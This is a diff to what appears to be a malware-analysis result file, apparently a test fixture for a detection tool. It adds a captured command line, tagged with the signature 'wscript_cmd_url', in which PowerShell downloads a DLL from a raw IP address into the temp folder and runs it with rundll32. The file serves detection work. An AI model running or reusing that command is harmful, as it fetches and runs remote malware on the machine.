@@ -231,6 +231,13 @@
           }
         },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\adeP1F.dll;start-process rundll32 %temp%\\adeP1F.dll N115"
+              ]
+            }
+          },
           "network": {
             "dynamic": {
               "ip": [
@@ -389,6 +396,15 @@
       }
     ],
     "tags": {
+      "dynamic.process.command_line": [
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_cmd_url"
+          ],
+          "value": "cmd.exe cmd /c start /min powershell IWR -uri http://165.22.160.25/w9edb/160223 -o %temp%\\adeP1F.dll;start-process rundll32 %temp%\\adeP1F.dll N115"
+        }
+      ],
       "file.string.extracted": [
         {
           "heur_id": 2,
